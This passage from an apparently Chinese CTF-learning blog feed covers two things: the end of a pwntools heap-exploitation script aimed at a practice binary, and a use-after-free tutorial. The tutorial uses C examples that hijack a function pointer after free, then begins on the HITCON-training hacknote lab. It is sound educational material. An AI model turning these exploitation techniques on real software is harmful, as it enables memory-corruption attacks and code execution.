class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x60203a&lt;/span&gt;))//这个需要填入覆盖地址了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x40\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;+p64(ELF.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;gg&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recv(1024)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;













</content>
        <category term="PWN入门" />
        <category term="堆" />
        <updated>2023-03-07T06:54:38.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/</id>
        <title>pwn入门-15-堆利用之Use-After-Free</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/"/>
        <content type="html">&lt;h1 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h1&gt;&lt;p&gt;复制的wiki的:&lt;/p&gt;
&lt;p&gt;简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。&lt;/li&gt;
&lt;li&gt;内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么&lt;strong&gt;程序很有可能可以正常运转&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，&lt;strong&gt;就很有可能会出现奇怪的问题&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而我们一般所指的 &lt;strong&gt;Use After Free&lt;/strong&gt; 漏洞主要是后两种。此外，&lt;strong&gt;我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;自己的理解&#34;&gt;&lt;a href=&#34;#自己的理解&#34; class=&#34;headerlink&#34; title=&#34;自己的理解&#34;&gt;&lt;/a&gt;自己的理解&lt;/h2&gt;&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;我理解的就是free后没有清空指针,导致还可以继续利用,利用的方式就是申请到free的bins然后覆盖上数据,借此修改一些函数指向等&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		4.16补充: 其实利用方式很多,总的来说是free后要对它能进行一定的操作,然后free前的功能还能用,比如puts等,就会导致问题.&lt;/p&gt;
&lt;h1 id=&#34;例子&#34;&gt;&lt;a href=&#34;#例子&#34; class=&#34;headerlink&#34; title=&#34;例子&#34;&gt;&lt;/a&gt;例子&lt;/h1&gt;&lt;p&gt;​		这是wiki上的例子,可以编译一下然后看看效果&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;name&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *myname;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*func)(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; NAME;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;myprint&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str)&lt;/span&gt; &amp;#123; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, str); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;printmyname&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;call print my name\n&amp;quot;&lt;/span&gt;); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  NAME *a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a = (NAME *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; name));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func = myprint;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;myname = &lt;span class=&#34;string&#34;&gt;&amp;quot;I can also use it&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is my function&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// free without modify&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func(&lt;span class=&#34;string&#34;&gt;&amp;quot;I can also use it&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// free with modify&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func = printmyname;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is my function&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// set NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this pogram will crash...\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a-&amp;gt;func(&lt;span class=&#34;string&#34;&gt;&amp;quot;can not be printed...&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		细节注意:编译的时候要指定好libc,不然如果使用的libc版本过高就会有问题,之前一直在踩这个坑…而且如果事先不指定,编译完再patchelf的话也会有问题,(目前还不懂)&lt;/p&gt;
&lt;p&gt;​	gcc -Wl,-rpath&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;&amp;#x2F;,–dynamic-linker&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;ld-linux-x86-64.so.2 1.c&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/heap/useafter# ./a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;this is my function&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;I can also use it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call print my name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;this pogram will crash...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Segmentation &lt;span class=&#34;title function_&#34;&gt;fault&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(core dumped)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​			a &amp;#x3D; NULL的话 , free的过程是怎样的? NULL修改了什么呢?&lt;/p&gt;
&lt;h2 id=&#34;看雪的一个例子&#34;&gt;&lt;a href=&#34;#看雪的一个例子&#34; class=&#34;headerlink&#34; title=&#34;看雪的一个例子&#34;&gt;&lt;/a&gt;看雪的一个例子&lt;/h2&gt;&lt;p&gt;具体看雪的链接找不到了..&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;func1&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;func1\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hack\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Pfunc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*p)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Pfunc&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;lpfunc&lt;/span&gt; =&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lpfunc-&amp;gt;p = func1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lpfunc-&amp;gt;p();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(lpfunc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;* hack_point = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *hack_point = hack;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lpfunc-&amp;gt;p();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这个函数就是先申请一个Pfunc结构体指针,分配了一块堆空间,然后把它结构体成员p赋值为一个函数地址,就可以调用了. 然后将这个结构体释放,又申请了一个新的堆空间,赋值为另外一个函数,&lt;font color=&#34;red&#34;&gt;原先的结构体指针仍然可以利用&lt;/font&gt; ,&lt;/p&gt;
&lt;p&gt;​		那free和没free有什么差别呢????????? free的话,是把这块空间标记为空闲可用,所以说应该还有一个地方,存储着这块空间的管理结构,但是这块空间本身是没有改变的.&lt;/p&gt;
&lt;h2 id=&#34;HITCON-training-中的-lab-10-hacknote&#34;&gt;&lt;a href=&#34;#HITCON-training-中的-lab-10-hacknote&#34; class=&#34;headerlink&#34; title=&#34;HITCON-training 中的 lab 10 hacknote&#34;&gt;&lt;/a&gt;HITCON-training 中的 &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote&#34;&gt;lab 10 hacknote&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;main&lt;/p&gt;
&lt;p&gt;​		获取用户的输入,然后根据输入进行不同的选择&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; 